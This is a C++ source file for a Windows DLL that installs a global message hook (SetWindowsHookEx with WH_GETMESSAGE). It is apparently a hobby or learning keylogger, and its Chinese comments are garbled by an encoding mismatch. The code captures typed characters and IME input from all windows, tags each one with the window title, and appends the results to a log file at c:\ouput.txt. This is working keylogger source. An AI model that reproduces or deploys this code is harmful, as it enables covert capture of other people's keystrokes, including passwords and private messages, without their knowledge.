// dllmain.cpp : ���� DLL Ӧ�ó������ڵ㡣
#include "stdafx.h"
#include <windows.h>
#include <iostream>

HHOOK g_hHook = nullptr;
HINSTANCE g_hInstance = nullptr;



LRESULT CALLBACK MsgHookProc(int nCode, WPARAM wPARAM, LPARAM lParam)
{
	if (HC_ACTION == nCode) //˵������Ϣ����
	{
		PMSG pMsg = (PMSG)lParam;
		char szWindowName[MAXBYTE] = { 0 };
		char szOutput[MAXBYTE] = { 0 };
		char szOutput2[MAXBYTE] = { 0 };
		FILE *logfile;
		if (pMsg->message == WM_CHAR)//�ַ���Ϣ
		{
			//ȷ����ʱ�Ѿ�����һ����
			char szKey = (char)pMsg->wParam;
			//MessageBox(nullptr, L"�㰴����һ����", L"", MB_OK);
			if (szKey >= 32 && szKey <= 126) //��Ч�ַ���Ϣ 32��126֮��
			{
				GetWindowTextA(pMsg->hwnd, szWindowName, MAXBYTE);//�ĸ�����
				sprintf_s(szOutput, MAXBYTE, "���ڣ�[%s]���յ���%c\n", szWindowName, szKey);
				OutputDebugStringA(szOutput);
				fopen_s(&logfile, "c:\\ouput.txt", "a+");
				fprintf(logfile,szOutput);
				fclose(logfile);
			}

		}
		//////////////////////////////////////////////
		else if (pMsg->message == WM_IME_CHAR)//���뷨��Ϣ
		{
			//ȷ����ʱ�Ѿ�����һ����
			char szKey2 = (char)pMsg->wParam;
			GetWindowTextA(pMsg->hwnd, szWindowName, MAXBYTE);//�ĸ�����
			sprintf_s(szOutput2, MAXBYTE, "���ڣ�[%s]���յ���%c\n", szWindowName, szKey2);
			OutputDebugStringA(szOutput2);
			fopen_s(&logfile, "c:\\ouput.txt", "a+");
			fprintf(logfile, szOutput2);
			fclose(logfile);
			//���뷨����Ϣ�޷���¼��ԭ������
		}

	}
	return CallNextHookEx(g_hHook, nCode, wPARAM, lParam);
}

extern "C"
_declspec(dllexport) BOOL StartHook()
{
	g_hHook = SetWindowsHookEx(WH_GETMESSAGE, MsgHookProc, g_hInstance, NULL);//�ص�����
	if (g_hHook == nullptr)
	{
		unsigned long dwError = GetLastError();
		return FALSE;
	}
	return TRUE;
}
BOOL UnHook()
{
	if (g_hHook)
	{
		return UnhookWindowsHookEx(g_hHook);
	}
	return FALSE;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		g_hInstance = hModule;
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		UnHook();
		break;
	}
	return TRUE;
}

